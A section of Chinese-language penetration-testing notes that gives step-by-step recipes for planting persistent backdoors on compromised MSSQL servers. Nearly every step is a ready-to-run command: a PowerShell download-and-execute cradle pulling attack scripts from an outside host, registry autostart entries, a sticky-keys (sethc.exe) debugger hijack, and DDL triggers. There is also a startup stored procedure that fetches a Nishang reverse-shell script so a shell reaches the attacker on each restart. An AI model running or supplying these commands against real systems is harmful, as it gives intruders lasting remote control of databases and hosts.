  #### 注册表自启动
	>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1');Get-SQLPersistRegRun -Verbose -Name Update -Command 'c:\windows\temp\Update.exe' -Instance "zone.com\sub2k8""
  #### 重启MSSQL上线(需重启服务)
	http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1
	>powershell -ep bypass 
	>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1') 
	>Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "zone.com\sub2k8" -PsCommand "IEX(new-object net.webclient).downloadstring('http://192.168.0.107/xxxx')" 远程木马脚本可用CS/Empire生成
	>net stop mssqlserver
	>net start mssqlserver
  #### 映像劫持
	>powershell -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1');Get-SQLPersistRegDebugger -Verbose -FileName sethc.exe -Command "c:\windows\system32\cmd.exe" -Instance "zone.com\sub2k8""
  #### DDL事件触发
	>powershell -exec bypass 
	>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/Invoke-SqlServer-Persist-TriggerDDL.psm1') 
	>Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance "zone\sub2k8" -PsCommand "IEX(new-object net.webclient).downloadstring('http://192.168.0.107/xxxx')"  远程木马文件可用CS/Empire生成
	>Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance " zone\sub2k8" -Remove   移除后门
  #### WarSQLKit(后门)
	http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit
  #### 存储过程维持权限
	>USE master
	>GO
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/912.png)

	>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/913.png)

	修改下脚本的ip和端口
	创建个web服务，把脚本传上去
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/914.png)

	创建存储过程
	>CREATE PROCEDURE test_sp
	>AS
	>EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://192.168.1.2/Invoke-PowerShellTcpOneLine.ps1'')"'
	>GO
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/915.png)

	设置服务器启动时立刻执行
	EXEC sp_procoption @ProcName = 'test_sp'
	, @OptionName = 'startup'
	, @OptionValue = 'on';
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/916.png)

	设置完成，使用命令可以查到我们的存储过程
	>SELECT * FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY ( id, 'ExecIsStartUp' ) = 1 ;
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/917.png)

	打开nc监听
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/918.png)

	重启后可以收到会话
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/919.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/920.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/921.png)